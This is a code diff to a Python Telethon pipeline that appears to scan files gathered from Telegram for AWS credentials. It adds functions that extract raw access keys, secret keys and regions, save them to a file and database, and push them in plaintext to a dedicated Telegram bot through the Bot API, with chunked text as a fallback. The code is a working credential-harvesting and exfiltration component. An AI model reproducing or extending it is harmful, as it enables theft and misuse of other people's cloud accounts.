@@ -11,6 +11,7 @@ import time
 from dataclasses import dataclass
 from pathlib import Path
 from urllib.parse import urlparse
+import aiohttp
 import uvicorn
 from telethon import TelegramClient, events
 from telethon.errors import AuthKeyDuplicatedError, FloodWaitError
@@ -363,6 +364,80 @@ class Pipeline:
         if not chat_id or self.client is None: return None
         try: return await self.client.send_message(chat_id,text,reply_to=reply_to)
         except Exception: LOG.exception('Progress notification failed',extra={'message_id':reply_to,'stage':'notification'}); return None
+
+    async def notify_cred_bot(self, text: str, document: Path | None = None) -> bool:
+        """Send credential alerts through the dedicated Telegram bot (Bot API)."""
+        token = self.s.cred_alert_bot_token
+        chat_id = self.s.cred_alert_chat_id
+        if not token or not chat_id:
+            return False
+        base = f'https://api.telegram.org/bot{token}'
+        try:
+            timeout = aiohttp.ClientTimeout(total=30)
+            async with aiohttp.ClientSession(timeout=timeout) as session:
+                if document is not None and document.is_file():
+                    form = aiohttp.FormData()
+                    form.add_field('chat_id', str(chat_id))
+                    form.add_field('caption', text[:1024])
+                    form.add_field(
+                        'document',
+                        document.read_bytes(),
+                        filename=document.name,
+                        content_type='text/plain',
+                    )
+                    async with session.post(f'{base}/sendDocument', data=form) as resp:
+                        payload = await resp.json(content_type=None)
+                        if not payload.get('ok'):
+                            raise RuntimeError(payload.get('description') or f'HTTP {resp.status}')
+                else:
+                    async with session.post(
+                        f'{base}/sendMessage',
+                        json={'chat_id': chat_id, 'text': text[:4096]},
+                    ) as resp:
+                        payload = await resp.json(content_type=None)
+                        if not payload.get('ok'):
+                            raise RuntimeError(payload.get('description') or f'HTTP {resp.status}')
+            return True
+        except Exception:
+            LOG.exception('Credential bot alert failed', extra={'stage': 'cred-alert'})
+            return False
+
+    async def alert_credentials(self, job: Job, raw_creds: list[dict]) -> None:
+        """Persist + push found credentials to the alert bot whenever configured."""
+        if not raw_creds:
+            return
+        await asyncio.to_thread(self.db.save_credentials, job.id, raw_creds)
+        creds_file = self.s.output_dir / f'credentials-{job.message_id}.txt'
+        creds_lines = [f"{c['access_key']}:{c['secret_key']}:{c['region']}" for c in raw_creds]
+        await asyncio.to_thread(
+            lambda: (creds_file.write_text('\n'.join(creds_lines) + '\n', encoding='utf-8'), creds_file.chmod(0o600))
+        )
+        unique_files = len({c['file'] for c in raw_creds})
+        source = job.source_link or job.source or 'job'
+        caption = (
+            f"🔑 AWS credentials found\n"
+            f"Job #{job.id}\n"
+            f"Source: {source}\n"
+            f"Count: {len(raw_creds)}\n"
+            f"Files: {unique_files}"
+        )
+        # Prefer document upload so long credential lists are not truncated.
+        sent = await self.notify_cred_bot(caption, document=creds_file)
+        if not sent:
+            # Fallback to chunked plain text if document send failed / bot unset.
+            body = caption + "\n\n" + "\n".join(creds_lines)
+            for start in range(0, len(body), 3500):
+                await self.notify_cred_bot(body[start:start + 3500])
+        LOG.info(
+            'Credentials extracted and alerted',
+            extra={
+                'job_id': job.id,
+                'message_id': job.message_id,
+                'creds_count': len(raw_creds),
+                'files_with_creds': unique_files,
+                'stage': 'cred-alert',
+            },
+        )
 
     @staticmethod
     def _bar(fraction:float,width:int=16)->str:
@@ -833,33 +908,26 @@ class Pipeline:
             await self.notify(job.chat_id,scan_msg,job.message_id)
             LOG.info('Credential scan complete',extra={'job_id':job.id,'message_id':job.message_id,'files_scanned':summary['files_scanned'],'findings':summary['findings'],'stage':'processing'})
             
-            # Extract raw credentials and send to Telegram
+            # Extract raw credentials and alert via bot (and legacy chat notify when present).
             await self.notify(job.chat_id,'🔑 Extracting raw AWS credentials…',job.message_id)
             raw_creds=await asyncio.to_thread(
                 extract_raw_credentials, root, 8, self.s.output_dir, self.s.max_scan_file_bytes
             )
-            
+
             if raw_creds:
-                await asyncio.to_thread(self.db.save_credentials,job.id,raw_creds)
-            
-            if raw_creds and job.chat_id:
-                creds_file=self.s.output_dir/f'credentials-{job.message_id}.txt'
-                creds_lines=[f"{c['access_key']}:{c['secret_key']}:{c['region']}" for c in raw_creds]
-                creds_file.write_text('\n'.join(creds_lines)+'\n',encoding='utf-8')
-                creds_file.chmod(0o600)
-                
-                # Count files with credentials
-                unique_files=len(set(c['file'] for c in raw_creds))
-                creds_msg=(
-                    f"🔑 AWS Credentials Extracted (key:secret:region)\n"
-                    f"📊 Total credentials found: {len(raw_creds)}\n"
-                    f"📁 Files containing credentials: {unique_files}\n"
-                    f"✅ Credentials file ready to download"
-                )
-                await self.notify(job.chat_id,creds_msg,job.message_id)
-                if self.client is not None:
-                    await self.client.send_file(job.chat_id,str(creds_file),caption=creds_msg,reply_to=job.message_id)
-                LOG.info('Credentials extracted and sent',extra={'job_id':job.id,'message_id':job.message_id,'creds_count':len(raw_creds),'files_with_creds':unique_files,'stage':'processing'})
+                await self.alert_credentials(job, raw_creds)
+                if job.chat_id:
+                    creds_file=self.s.output_dir/f'credentials-{job.message_id}.txt'
+                    unique_files=len(set(c['file'] for c in raw_creds))
+                    creds_msg=(
+                        f"🔑 AWS Credentials Extracted (key:secret:region)\n"
+                        f"📊 Total credentials found: {len(raw_creds)}\n"
+                        f"📁 Files containing credentials: {unique_files}\n"
+                        f"✅ Credentials file ready to download"
+                    )
+                    await self.notify(job.chat_id,creds_msg,job.message_id)
+                    if self.client is not None and creds_file.is_file():
+                        await self.client.send_file(job.chat_id,str(creds_file),caption=creds_msg,reply_to=job.message_id)
             else:
                 if job.chat_id:
                     await self.notify(job.chat_id,'⚠️ No raw AWS credentials found in extracted files',job.message_id)
